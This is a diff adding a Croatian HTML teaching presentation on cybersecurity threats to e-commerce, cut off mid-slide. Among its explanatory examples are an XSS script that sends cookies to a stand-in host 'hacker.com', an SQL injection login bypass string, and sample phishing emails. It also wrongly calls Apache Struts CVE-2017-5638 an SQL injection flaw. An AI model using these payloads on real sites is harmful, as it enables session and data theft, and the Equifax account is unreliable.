@@ -1,0 +1,1151 @@
+<artifact identifier="tjedan13-prezentacija" type="text/html" title="Tjedan 13: Uvod u cybersecurity i prijetnje">
+<!DOCTYPE html>
+<html lang="hr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tjedan 13: Uvod u cybersecurity i prijetnje</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        overflow: hidden;
+        height: 100vh;
+    }
+
+    .presentation {
+        width: 100%;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .slide {
+        background: white;
+        width: 90%;
+        max-width: 1200px;
+        height: 85vh;
+        border-radius: 20px;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        padding: 60px;
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        animation: slideIn 0.5s ease;
+        overflow-y: auto;
+    }
+
+    .slide.active {
+        display: flex;
+    }
+
+    @keyframes slideIn {
+        from { opacity: 0; transform: translateX(50px); }
+        to { opacity: 1; transform: translateX(0); }
+    }
+
+    .slide h1 {
+        font-size: 3.5em;
+        color: #667eea;
+        margin-bottom: 20px;
+        font-weight: 700;
+    }
+
+    .slide h2 {
+        font-size: 2.5em;
+        color: #333;
+        margin-bottom: 30px;
+        font-weight: 600;
+    }
+
+    .slide h3 {
+        font-size: 1.8em;
+        color: #667eea;
+        margin: 30px 0 20px 0;
+    }
+
+    .slide p {
+        font-size: 1.4em;
+        color: #555;
+        line-height: 1.8;
+        margin-bottom: 20px;
+    }
+
+    .slide ul {
+        font-size: 1.3em;
+        color: #555;
+        line-height: 2;
+        margin-left: 40px;
+    }
+
+    .slide li {
+        margin-bottom: 15px;
+    }
+
+    .subtitle {
+        font-size: 1.8em;
+        color: #764ba2;
+        margin-top: 20px;
+    }
+
+    .highlight {
+        background: linear-gradient(120deg, #ffecd2 0%, #fcb69f 100%);
+        padding: 30px;
+        border-radius: 15px;
+        margin: 20px 0;
+    }
+
+    .highlight h3 {
+        color: #2c3e50;
+        margin: 0 0 15px 0;
+    }
+
+    .highlight p {
+        color: #2c3e50;
+        font-size: 1.2em;
+    }
+
+    .warning-box {
+        background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+        color: white;
+        padding: 30px;
+        border-radius: 15px;
+        margin: 20px 0;
+        border-left: 8px solid #c92a2a;
+    }
+
+    .warning-box h3 {
+        color: white;
+        margin-bottom: 15px;
+    }
+
+    .warning-box p {
+        color: white;
+        font-size: 1.2em;
+    }
+
+    .case-study {
+        background: #f8f9fa;
+        border-left: 5px solid #667eea;
+        padding: 30px;
+        border-radius: 10px;
+        margin: 20px 0;
+    }
+
+    .threat-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 20px;
+        margin-top: 30px;
+    }
+
+    .threat-card {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        padding: 30px;
+        border-radius: 15px;
+        color: white;
+        text-align: center;
+        transition: transform 0.3s;
+    }
+
+    .threat-card:hover {
+        transform: translateY(-10px);
+    }
+
+    .threat-icon {
+        font-size: 3em;
+        margin-bottom: 15px;
+    }
+
+    .threat-card h4 {
+        font-size: 1.5em;
+        margin-bottom: 15px;
+    }
+
+    .threat-card p {
+        color: rgba(255,255,255,0.9);
+        font-size: 1em;
+    }
+
+    .stats-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 20px;
+        margin-top: 30px;
+    }
+
+    .stat-box {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        padding: 30px;
+        border-radius: 15px;
+        text-align: center;
+    }
+
+    .stat-number {
+        font-size: 3em;
+        font-weight: 700;
+        margin-bottom: 10px;
+    }
+
+    .stat-label {
+        font-size: 1.1em;
+        opacity: 0.9;
+    }
+
+    .security-layer {
+        background: white;
+        border: 3px solid #667eea;
+        padding: 25px;
+        margin: 15px 0;
+        border-radius: 10px;
+        position: relative;
+    }
+
+    .layer-number {
+        position: absolute;
+        top: -15px;
+        left: 20px;
+        background: #667eea;
+        color: white;
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 700;
+        font-size: 1.3em;
+    }
+
+    .attack-timeline {
+        background: #f8f9fa;
+        padding: 20px;
+        border-left: 5px solid #ff6b6b;
+        margin: 15px 0;
+        border-radius: 8px;
+    }
+
+    .navigation {
+        position: fixed;
+        bottom: 30px;
+        right: 30px;
+        display: flex;
+        gap: 15px;
+    }
+
+    .nav-btn {
+        background: white;
+        color: #667eea;
+        border: none;
+        padding: 15px 30px;
+        font-size: 1.2em;
+        border-radius: 50px;
+        cursor: pointer;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        transition: all 0.3s;
+        font-weight: 600;
+    }
+
+    .nav-btn:hover {
+        background: #667eea;
+        color: white;
+        transform: translateY(-2px);
+    }
+
+    .slide-counter {
+        position: fixed;
+        bottom: 30px;
+        left: 30px;
+        background: white;
+        color: #667eea;
+        padding: 10px 20px;
+        border-radius: 50px;
+        font-size: 1.2em;
+        font-weight: 600;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    }
+
+    @media (max-width: 768px) {
+        .slide { padding: 30px; }
+        .slide h1 { font-size: 2em; }
+        .slide h2 { font-size: 1.8em; }
+        .threat-grid { grid-template-columns: 1fr; }
+        .stats-grid { grid-template-columns: 1fr; }
+    }
+</style>
+</head>
+<body>
+    <div class="presentation">
+        <!-- Slide 1: Naslovnica -->
+        <div class="slide active">
+            <h1>🔐 CYBERSECURITY</h1>
+            <p class="subtitle">Tjedan 13: Uvod u sigurnosne prijetnje</p>
+            <div class="warning-box" style="margin-top: 80px;">
+            <h3>⚠️ MODUL 3: Sigurnost e-trgovine</h3>
+            <p>Naučite kako zaštititi web shop od hackera, virusa i prijevara!</p>
+        </div>
+
+        <div class="stats-grid" style="margin-top: 40px;">
+            <div class="stat-box">
+                <div class="stat-number">$9.5T</div>
+                <div class="stat-label">Šteta od cybercrimea 2024</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number">2,200</div>
+                <div class="stat-label">Cyber napada dnevno</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number">43%</div>
+                <div class="stat-label">Malih tvrtki je napadnuto</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 2: Što je cybersecurity? -->
+    <div class="slide">
+        <h2>🛡️ Što je Cybersecurity?</h2>
+        
+        <p><strong>Cybersecurity</strong> = zaštita računalnih sustava, mreža i podataka od digitalnih napada.</p>
+
+        <div class="highlight">
+            <h3>🎯 Tri stupa sigurnosti (CIA Triad):</h3>
+            <p><strong>C - Confidentiality (Povjerljivost):</strong> Samo ovlašteni imaju pristup<br>
+            <strong>I - Integrity (Integritet):</strong> Podaci nisu promijenjeni<br>
+            <strong>A - Availability (Dostupnost):</strong> Sustav radi kad treba</p>
+        </div>
+
+        <h3>Zašto je važno za e-trgovinu?</h3>
+        <ul>
+            <li>💳 <strong>Kreditne kartice kupaca</strong> - ako ih ukradu, karijera je gotova</li>
+            <li>📧 <strong>Osobni podaci</strong> - GDPR kazne do €20M ili 4% godišnjeg prometa</li>
+            <li>🏪 <strong>Reputacija</strong> - jedan hack = izgubite povjerenje kupaca</li>
+            <li>💰 <strong>Financijski gubitak</strong> - prosječan data breach košta $4.45M</li>
+            <li>⚖️ <strong>Pravne posljedice</strong> - tužbe, kazne, zatvor</li>
+        </ul>
+
+        <div class="case-study" style="margin-top: 30px;">
+            <h3>💡 Primjer:</h3>
+            <p><strong>Target (2013):</strong> Hakirano 40 milijuna kreditnih kartica.<br>
+            <strong>Šteta:</strong> $290 milijuna u settlement-ima + destroyed brand trust<br>
+            <strong>CEO:</strong> Dao ostavku nakon napada</p>
+        </div>
+    </div>
+
+    <!-- Slide 3: Vrste cyber prijetnji -->
+    <div class="slide">
+        <h2>☠️ Glavne vrste cyber prijetnji</h2>
+        
+        <div class="threat-grid">
+            <div class="threat-card">
+                <div class="threat-icon">🦠</div>
+                <h4>Malware</h4>
+                <p>Zlonamjerni software</p>
+                <ul style="text-align: left; margin-left: 20px; font-size: 0.95em; margin-top: 10px; color: #00f2fe;">
+                    <li>Virusi</li>
+                    <li>Trojanci</li>
+                    <li>Ransomware</li>
+                    <li>Spyware</li>
+                </ul>
+            </div>
+
+            <div class="threat-card" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);">
+                <div class="threat-icon">🎣</div>
+                <h4>Phishing</h4>
+                <p>Lažne poruke/stranice</p>
+                <ul style="text-align: left; margin-left: 20px; font-size: 0.95em; margin-top: 10px;">
+                    <li>Email phishing</li>
+                    <li>SMS phishing</li>
+                    <li>Fake web stranice</li>
+                    <li>Social engineering</li>
+                </ul>
+            </div>
+
+            <div class="threat-card" style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);">
+                <div class="threat-icon">💉</div>
+                <h4>Injection Napadi</h4>
+                <p>Ubacivanje malicious koda</p>
+                <ul style="text-align: left; margin-left: 20px; font-size: 0.95em; margin-top: 10px;">
+                    <li>SQL injection</li>
+                    <li>XSS (Cross-site)</li>
+                    <li>Command injection</li>
+                    <li>LDAP injection</li>
+                </ul>
+            </div>
+
+            <div class="threat-card" style="background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);">
+                <div class="threat-icon">🚪</div>
+                <h4>Brute Force</h4>
+                <p>Probavanje svih kombinacija</p>
+                <ul style="text-align: left; margin-left: 20px; font-size: 0.95em; margin-top: 10px;">
+                    <li>Password guessing</li>
+                    <li>Dictionary attacks</li>
+                    <li>Credential stuffing</li>
+                </ul>
+            </div>
+
+            <div class="threat-card" style="background: linear-gradient(135deg, #30cfd0 0%, #330867 100%);">
+                <div class="threat-icon">📡</div>
+                <h4>Man-in-the-Middle</h4>
+                <p>Prisluškivanje komunikacije</p>
+                <ul style="text-align: left; margin-left: 20px; font-size: 0.95em; margin-top: 10px; color: #00f2fe;">
+                    <li>WiFi sniffing</li>
+                    <li>Session hijacking</li>
+                    <li>DNS spoofing</li>
+                </ul>
+            </div>
+
+            <div class="threat-card" style="background: linear-gradient(135deg, #a8edea 0%, #6d3446 100%);">
+                <div class="threat-icon">💥</div>
+                <h4>DDoS</h4>
+                <p>Preopterećenje servera</p>
+                <ul style="text-align: left; margin-left: 20px; font-size: 0.95em; margin-top: 10px;">
+                    <li>Flooding napadi</li>
+                    <li>Botnet napadi</li>
+                    <li>Amplification</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 4: Malware detaljno -->
+    <div class="slide">
+        <h2>🦠 Malware - Zlonamjerni software</h2>
+        
+        <p><strong>Malware</strong> = MALicious softWARE - bilo koji software dizajniran da naškodi.</p>
+
+        <div class="case-study">
+            <h4>1️⃣ Virus</h4>
+            <p><strong>Što je:</strong> Kod koji se spaja na legitimne fileove i širi se kada ih korisnik pokrene<br>
+            <strong>Kako radi:</strong> Inficira .exe, .doc, .pdf fileove<br>
+            <strong>Šteta:</strong> Briše fileove, korupcija podataka, krade informacije<br>
+            <strong>Primjer:</strong> ILOVEYOU virus (2000) - $15 milijardi štete</p>
+        </div>
+
+        <div class="case-study">
+            <h4>2️⃣ Trojan (Trojanski konj)</h4>
+            <p><strong>Što je:</strong> Izgleda kao legitiman program, ali je zlonamjeran<br>
+            <strong>Kako radi:</strong> Korisnik dobrovoljno instalira misleći da je safe<br>
+            <strong>Šteta:</strong> Backdoor pristup, krađa podataka, keylogging<br>
+            <strong>Primjer:</strong> Emotet - krao bankovne podatke</p>
+        </div>
+
+        <div class="case-study">
+            <h4>3️⃣ Ransomware 🔒</h4>
+            <p><strong>Što je:</strong> Enkriptira vaše fileove i traži otkupninu<br>
+            <strong>Kako radi:</strong> Enkriptira sve podatke, ostavlja poruku "Pay $X in Bitcoin"<br>
+            <strong>Šteta:</strong> Potpuni gubitak podataka ako ne platite (a i ako platite!)<br>
+            <strong>Primjer:</strong> WannaCry (2017) - 200,000 računala u 150 zemalja</p>
+        </div>
+
+        <div class="case-study">
+            <h4>4️⃣ Spyware 👁️</h4>
+            <p><strong>Što je:</strong> Tajno prati vašu aktivnost<br>
+            <strong>Kako radi:</strong> Bilježi tipkanje (keylogger), screenshotovi, webcam<br>
+            <strong>Šteta:</strong> Krađa lozinki, kreditnih kartica, špijuniranje<br>
+            <strong>Primjer:</strong> Pegasus - špijunirao novinare i aktive</p>
+        </div>
+    </div>
+
+    <!-- Slide 5: Phishing napadi -->
+    <div class="slide">
+        <h2>🎣 Phishing - Najčešći napad</h2>
+        
+        <p><strong>Phishing</strong> = prevara gdje napadač glumi legitimnu tvrtku da ukrade podatke.</p>
+
+        <div class="warning-box">
+            <h3>📊 Statistika:</h3>
+            <p>• 90% cyber napada počinje s phishing email-om<br>
+            • 1 od 4,200 email-ova je phishing<br>
+            • 32% uspješnih breacheva uključuje phishing</p>
+        </div>
+
+        <h3>Vrste phishing napada:</h3>
+
+        <div class="case-study">
+            <h4>1️⃣ Email Phishing</h4>
+            <p><strong>Primjer:</strong><br>
+            "From: PayPal Security <no-reply@paypa1.com><br>
+            Subject: Your account has been suspended!<br>
+            <br>
+            Dear customer,<br>
+            We detected suspicious activity. Click here to verify: http://paypal-verify.tk"<br>
+            <br>
+            <strong>Red flags:</strong><br>
+            • Pogrešna domena (paypa1 umjesto paypal)<br>
+            • Hitnost ("immediately")<br>
+            • Sumnjiv link (.tk domena)<br>
+            • Generičko obraćanje ("Dear customer")</p>
+        </div>
+
+        <div class="case-study">
+            <h4>2️⃣ Spear Phishing (ciljani napad)</h4>
+            <p><strong>Primjer:</strong><br>
+            "From: CEO Ivan Horvat<br>
+            To: CFO Marija Kovač<br>
+            Subject: URGENT - Wire Transfer Needed<br>
+            <br>
+            Marija, need you to send €50,000 to supplier ASAP. Invoice attached."<br>
+            <br>
+            <strong>Cilj:</strong> Specifična osoba u tvrtki<br>
+            <strong>Tehnika:</strong> Istraživanje na LinkedInu, osobne informacije</p>
+        </div>
+
+        <div class="case-study">
+            <h4>3️⃣ Smishing (SMS phishing)</h4>
+            <p><strong>Primjer:</strong><br>
+            "Your package is waiting. Confirm delivery: bit.ly/xyz123"<br>
+            <br>
+            <strong>Cilj:</strong> Mobilni korisnici (manje sumnjičavi na telefonu)</p>
+        </div>
+    </div>
+
+    <!-- Slide 6: SQL Injection -->
+    <div class="slide">
+        <h2>💉 SQL Injection - #1 web ranjivost</h2>
+        
+        <p><strong>SQL Injection</strong> = ubacivanje SQL koda u input polja da se manipulira bazom podataka.</p>
+
+        <div class="highlight">
+            <h3>🎯 Kako radi (pojednostavljeno):</h3>
+            <p>Normalan login form:<br>
+            <code style="background: white; padding: 5px;">SELECT * FROM users WHERE username='admin' AND password='123456'</code><br>
+            <br>
+            Hacker upisuje u username polje:<br>
+            <code style="background: white; padding: 5px;">admin' OR '1'='1</code><br>
+            <br>
+            SQL postaje:<br>
+            <code style="background: white; padding: 5px;">SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='...'</code><br>
+            <br>
+            <strong>Rezultat:</strong> '1'='1' je uvijek TRUE → hacker je ulogiran bez lozinke!</p>
+        </div>
+
+        <h3>Što hacker može napraviti:</h3>
+        <ul>
+            <li>🔓 <strong>Bypass login</strong> - ulogirati se bez lozinke</li>
+            <li>📥 <strong>Izvući sve podatke</strong> - kreditne kartice, lozinke, emailovi</li>
+            <li>🗑️ <strong>Obrisati bazu</strong> - DROP TABLE users;</li>
+            <li>✏️ <strong>Modificirati podatke</strong> - promijeniti cijene proizvoda</li>
+            <li>👤 <strong>Kreirati admin račun</strong> - potpuna kontrola</li>
+        </ul>
+
+        <div class="case-study" style="margin-top: 30px;">
+            <h3>📖 Stvarni primjer:</h3>
+            <p><strong>Heartland Payment Systems (2008):</strong><br>
+            • SQL injection napad<br>
+            • Ukradeno 130 milijuna kreditnih kartica<br>
+            • Šteta: $140 milijuna<br>
+            • CEO morao dati ostavku</p>
+        </div>
+    </div>
+
+    <!-- Slide 7: XSS napad -->
+    <div class="slide">
+        <h2>🌐 XSS (Cross-Site Scripting)</h2>
+        
+        <p><strong>XSS</strong> = ubacivanje malicious JavaScript koda u web stranicu koju drugi korisnici vide.</p>
+
+        <div class="case-study">
+            <h4>Scenario: Forum ili komentar sekcija</h4>
+            <p>Hacker upiše u komentar:<br>
+            <code style="background: white; padding: 10px; display: block; margin: 10px 0;">
+            &lt;script&gt;
+            fetch('http://hacker.com/steal?cookie=' + document.cookie);
+            &lt;/script&gt;
+            </code><br>
+            <strong>Što se događa:</strong><br>
+            1. Komentar se spremi u bazu<br>
+            2. Drugi korisnici otvore stranicu<br>
+            3. JavaScript se izvršava u NJIHOVOM pregledniku<br>
+            4. Šalje njihov session cookie hackeru<br>
+            5. Hacker se može ulogirati kao žrtva!</p>
+        </div>
+
+        <h3>Vrste XSS-a:</h3>
+        <div class="threat-grid" style="grid-template-columns: 1fr 1fr; margin-top: 20px;">
+            <div class="threat-card">
+                <h4>Stored XSS</h4>
+                <p>Kod se trajno spremi na server (baza, komentari)<br>
+                <strong>Opasnost:</strong> ⚠️⚠️⚠️ Najopasniji!</p>
+            </div>
+
+            <div class="threat-card" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);">
+                <h4>Reflected XSS</h4>
+                <p>Kod u URL-u, izvršava se odmah<br>
+                <strong>Primjer:</strong> search.php?q=&lt;script&gt;...&lt;/script&gt;</p>
+            </div>
+        </div>
+
+        <div class="warning-box" style="margin-top: 30px;">
+            <h3>💡 Što hacker može ukrasti s XSS-om:</h3>
+            <p>• Session cookies (login bez lozinke)<br>
+            • Kreditne kartice (keylogger)<br>
+            • Preusmjeravanje na phishing stranicu<br>
+            • Modificiranje stranice (fake login forma)</p>
+        </div>
+    </div>
+
+    <!-- Slide 8: DDoS napadi -->
+    <div class="slide">
+        <h2>💥 DDoS - Distributed Denial of Service</h2>
+        
+        <p><strong>DDoS</strong> = preplavlj ivanje servera s tolikim prometom da normalni korisnici ne mogu pristupiti.</p>
+
+        <div class="highlight">
+            <h3>🎯 Analogija:</h3>
+            <p>Zamislite da je vaš web shop fizička trgovina.<br>
+            DDoS je kao da 10,000 ljudi istovremeno upada u trgovinu i samo stoji tu.<br>
+            Pravi kupci ne mogu ući! 🚪👥👥👥</p>
+        </div>
+
+        <h3>Kako radi DDoS:</h3>
+        <div class="attack-timeline">
+            <p><strong>1. Hacker kreira botnet:</strong><br>
+            Inficira tisuće računala s malwareom (bots/zombies)</p>
+        </div>
+
+        <div class="attack-timeline">
+            <p><strong>2. Command & Control:</strong><br>
+            Hacker kontrolira sve zaražena računala s jednog mjesta</p>
+        </div>
+
+        <div class="attack-timeline">
+            <p><strong>3. Napad:</strong><br>
+            Svi botovi istovremeno šalju requestove na vaš server<br>
+            • 1 bot = 100 req/sec<br>
+            • 10,000 botova = 1,000,000 req/sec<br>
+            • Vaš server: 💀</p>
+        </div>
+
+        <div class="attack-timeline">
+            <p><strong>4. Server pada:</strong><br>
+            Web shop je offline. Gubite €€€ svaku minutu!</p>
+        </div>
+
+        <div class="stats-grid" style="margin-top: 30px;">
+            <div class="stat-box">
+                <div class="stat-number">10M</div>
+                <div class="stat-label">DDoS napada godišnje</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number">$120K</div>
+                <div class="stat-label">Prosječan trošak DDoS-a</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number">3.47Tbps</div>
+                <div class="stat-label">Najveći DDoS ikad (2024)</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Slide 9: Man-in-the-Middle napadi -->
+    <div class="slide">
+        <h2>📡 Man-in-the-Middle (MITM) Napadi</h2>
+        
+        <p><strong>MITM</strong> = hacker presreće komunikaciju između dva korisnika i prisluškuje/mijenja podatke.</p>
+
+        <div class="case-study">
+            <h4>Scenarij: Javni WiFi napad</h4>
+            <div class="attack-timeline">
+                <p><strong>1. Setup:</strong><br>
+                Hacker postavlja fake WiFi hotspot "Starbucks_Free_WiFi"</p>
+            </div>
+
+            <div class="attack-timeline">
+                <p><strong>2. Žrtva se spaja:</strong><br>
+                Vi mislite da ste na legitimnom WiFi-u</p>
+            </div>
+
+            <div class="attack-timeline">
+                <p><strong>3. Sav promet ide kroz hackera:</strong><br>
+                Vi → Hacker → Internet → Hacker → Vi<br>
+                Hacker vidi SVE što radite!</p>
+            </div>
+
+            <div class="attack-timeline">
+                <p><strong>4. Krađa podataka:</strong><br>
+                • Lozinke (ako je HTTP)<br>
+                • Session cookies<br>
+                • Kreditne kartice<br>
+                • Privatni podaci</p>
+</div>
+</div>
+<h3 style="margin-top: 30px;">Vrste MITM napada:</h3>
+
+        <div class="threat-grid" style="grid-template-columns: 1fr 1fr;">
+            <div class="threat-card">
+                <div class="threat-icon">📶</div>
+                <h4>WiFi Eavesdropping</h4>
+                <p>Fake hotspot ili nesiguran javni WiFi<br>
+                <strong>Zaštita:</strong> Koristi VPN!</p>
+            </div>
+
+            <div class="threat-card" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);">
+                <div class="threat-icon">🌐</div>
+                <h4>DNS Spoofing</h4>
+                <p>Preusmjeravanje na fake web stranicu<br>
+                <strong>Primjer:</strong> Upišete amazon.com, dobijete fake stranicu</p>
+            </div>
+
+            <div class="threat-card" style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);">
+                <div class="threat-icon">🍪</div>
+                <h4>Session Hijacking</h4>
+                <p>Krađa session cookieja<br>
+                <strong>Rezultat:</strong> Hacker se ulogira kao vi</p>
+            </div>
+
+            <div class="threat-card" style="background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);">
+                <div class="threat-icon">🔓</div>
+                <h4>SSL Stripping</h4>
+                <p>Prisiljavanje na HTTP umjesto HTTPS<br>
+                <strong>Rezultat:</strong> Svi podaci plain text</p>
+            </div>
+        </div>
+
+        <div class="warning-box" style="margin-top: 30px;">
+            <h3>⚠️ NIKAD:</h3>
+            <p>• Ne ulogirati se na javnim WiFi mrežama bez VPN-a<br>
+            • Ne unositi kreditne kartice na HTTP stranicama<br>
+            • Ne spajati se na WiFi bez lozinke<br>
+            • Ne ignorirati HTTPS upozorenja browsera</p>
+        </div>
+    </div>
+
+    <!-- Slide 10: Social Engineering -->
+    <div class="slide">
+        <h2>🧠 Social Engineering - Hakiranje ljudi</h2>
+        
+        <p><strong>Social Engineering</strong> = manipulacija ljudi da otkriju povjerljive informacije ili učine nešto što ne bi trebali.</p>
+
+        <div class="highlight">
+            <h3>💡 Ključni princip:</h3>
+            <p>"Najslabija karika u sigurnosti nije tehnologija - to su LJUDI!"<br>
+            <br>
+            Lakše je prevariti čovjeka nego hakirati dobro zaštićen sustav.</p>
+        </div>
+
+        <h3>Tehnike Social Engineering-a:</h3>
+
+        <div class="case-study">
+            <h4>1️⃣ Pretexting (Izmišljena priča)</h4>
+            <p><strong>Scenarij:</strong><br>
+            Hacker nazove recepciju:<br>
+            "Dobar dan, ja sam IT support. CEO Marko Horvat mi je rekao da ima problem s računalom. Trebam njegovu lozinku da resetiram..."<br>
+            <br>
+            <strong>Što radi:</strong> Stvara lažnu priču (pretext) da dobije informacije</p>
+        </div>
+
+        <div class="case-study">
+            <h4>2️⃣ Baiting (Mamac)</h4>
+            <p><strong>Scenarij:</strong><br>
+            Hacker ostavlja USB stick u parkingu s natpisom "Plaće 2024 - POVJERLJIVO"<br>
+            Radoznao zaposlenik ga podigne i utakne u službeno računalo<br>
+            → Malware se instalira!<br>
+            <br>
+            <strong>Psihologija:</strong> Radoznalost + greed</p>
+        </div>
+
+        <div class="case-study">
+            <h4>3️⃣ Tailgating (Fizički pristup)</h4>
+            <p><strong>Scenarij:</strong><br>
+            Hacker nosi kutiju i čeka pred vratima s badge readrom<br>
+            Zaposlenik izlazi, hacker kaže "Hvala!" i uđe s njim<br>
+            → Fizički pristup uredu i serverima!<br>
+            <br>
+            <strong>Psihologija:</strong> Pristojnost - ljudi drže vrata</p>
+        </div>
+
+        <div class="case-study">
+            <h4>4️⃣ Quid Pro Quo (Nešto za nešto)</h4>
+            <p><strong>Scenarij:</strong><br>
+            "Imam besplatne ulaznice za koncert. Samo trebam tvoj email za slanje..."<br>
+            → Phishing email kasnije<br>
+            <br>
+            <strong>Psihologija:</strong> Želimo besplatne stvari</p>
+        </div>
+    </div>
+
+    <!-- Slide 11: Case Study - Target breach -->
+    <div class="slide">
+        <h2>🎯 Case Study: Target Data Breach (2013)</h2>
+        
+        <div class="warning-box">
+            <h3>📊 Brojke:</h3>
+            <p>• 40 milijuna kreditnih kartica ukradeno<br>
+            • 70 milijuna osobnih podataka kompromititirano<br>
+            • $290 milijuna u settlement-ima<br>
+            • CEO i CIO dali ostavke<br>
+            • Brand reputacija uništena</p>
+        </div>
+
+        <h3>Kako se dogodio napad (timeline):</h3>
+
+        <div class="attack-timeline">
+            <p><strong>KORAK 1: Phishing napad na HVAC dobavljača</strong><br>
+            Target je imao dobavljača (Fazio Mechanical) koji održava klimatizaciju u trgovinama.<br>
+            Hakeri su poslali phishing email zaposleniku Fazio-a.<br>
+            <strong>Rezultat:</strong> Dobili pristupne podatke za Target VPN</p>
+        </div>
+
+        <div class="attack-timeline">
+            <p><strong>KORAK 2: Pristup Target mreži</strong><br>
+            Koristili ukradene Fazio credentialse da uđu u Target mrežu.<br>
+            Iako je Fazio trebao imati samo pristup HVAC sustavima, mrežna segmentacija je bila loša.<br>
+            <strong>Rezultat:</strong> Pristup POS (Point of Sale) sustavima</p>
+        </div>
+
+        <div class="attack-timeline">
+            <p><strong>KORAK 3: Instalacija malware-a</strong><br>
+            Instalirali malware na POS terminale (blagajne) u 1,797 trgovina.<br>
+            Malware je "grebao" (skimming) podatke s kreditnih kartica dok kupci plaćaju.<br>
+            <strong>Rezultat:</strong> Real-time krađa kartica</p>
+        </div>
+
+        <div class="attack-timeline">
+            <p><strong>KORAK 4: Eksfiltracija podataka</strong><br>
+            Podaci su slani na FTP server u Rusiji.<br>
+            Target-ov FireEye sustav JE DETEKTIRAO napad, ali... nitko nije reagirao!<br>
+            <strong>Rezultat:</strong> 18 dana continuous data theft</p>
+        </div>
+
+        <div class="highlight" style="margin-top: 30px;">
+            <h3>💡 Lekcije:</h3>
+            <p>1. <strong>Third-party risk:</strong> Vaši dobavljači su ranjivost!<br>
+            2. <strong>Network segmentation:</strong> HVAC sistem ne smije imati pristup POS-u<br>
+            3. <strong>Security monitoring:</strong> Detektiranje ≠ sprječavanje (treba reagirati!)<br>
+            4. <strong>Incident response plan:</strong> Treba plan što napraviti kad se dogodi breach</p>
+        </div>
+    </div>
+
+    <!-- Slide 12: Case Study - Equifax breach -->
+    <div class="slide">
+        <h2>🏦 Case Study: Equifax Data Breach (2017)</h2>
+        
+        <div class="warning-box">
+            <h3>📊 Najgori breach u povijesti:</h3>
+            <p>• 147 milijuna Amerikanaca (skoro POLA populacije!)<br>
+            • Social Security Numbers, rođendani, adrese<br>
+            • 209,000 kreditnih kartica<br>
+            • $700 milijuna settlement<br>
+            • CEO, CIO, CSO svi dali ostavke</p>
+        </div>
+
+        <h3>Kako se dogodilo:</h3>
+
+        <div class="case-study">
+            <h4>🐛 Ranjivost: Apache Struts CVE-2017-5638</h4>
+            <p><strong>Poznata ranjivost:</strong> Objavljena u Ožujku 2017.<br>
+            Apache Struts framework imao je kritičnu SQL injection ranjivost.<br>
+            Patch je bio dostupan ODMAH.<br>
+            <br>
+            <strong>Equifax greška:</strong> NISU patchali 2 MJESECA!</p>
+        </div>
+
+        <div class="attack-timeline">
+            <p><strong>KORAK 1: Exploit (Svibanj 2017)</strong><br>
+            Hakeri su iskoristili Apache Struts ranjivost.<br>
+            SQL injection im je dao pristup bazi podataka.</p>
+        </div>
+
+        <div class="attack-timeline">
+            <p><strong>KORAK 2: Lateral movement</strong><br>
+            Kretali su se kroz mrežu 76 DANA bez detekcije.<br>
+            Pronašli su dodatne baze podataka s osobnim informacijama.</p>
+        </div>
+
+        <div class="attack-timeline">
+            <p><strong>KORAK 3: Eksfiltracija</strong><br>
+            Skinuli 147 milijuna zapisa.<br>
+            <strong>Problem:</strong> Podaci su bili nešifrirani u bazi! 🤦</p>
+        </div>
+
+        <div class="attack-timeline">
+            <p><strong>KORAK 4: Kasna detekcija</strong><br>
+            Equifax je otkrio breach 29. Srpnja - 76 dana nakon početka.<br>
+            Javnost obavijestili tek 7. Rujna - još 40 dana kasnije!</p>
+        </div>
+
+        <div class="highlight" style="margin-top: 30px;">
+            <h3>💡 Lekcije:</h3>
+            <p>1. <strong>Patch ODMAH:</strong> Poznate ranjivosti se eksploatiraju u satima!<br>
+            2. <strong>Encryption at rest:</strong> Podaci u bazi MORAJU biti enkriptirani<br>
+            3. <strong>Monitoring:</strong> 76 dana bez detekcije = katastrofa<br>
+            4. <strong>Transparency:</strong> Ne skrivajte breach - obavijestite odmah</p>
+        </div>
+    </div>
+
+    <!-- Slide 13: Defense in Depth -->
+    <div class="slide">
+        <h2>🛡️ Defense in Depth - Višeslojn a zaštita</h2>
+        
+        <p><strong>Defense in Depth</strong> = strategija multiple layer-a zaštite. Ako jedan layer padne, drugi štite.</p>
+
+        <div class="highlight">
+            <h3>🏰 Analogija: Srednjovjekovni zamak</h3>
+            <p>Zamak nije zaštićen samo zidom:<br>
+            • Rov s vodom (Layer 1)<br>
+            • Vanjski zid (Layer 2)<br>
+            • Stražari (Layer 3)<br>
+            • Unutarnji zid (Layer 4)<br>
+            • Kula s blagom (Layer 5)<br>
+            <br>
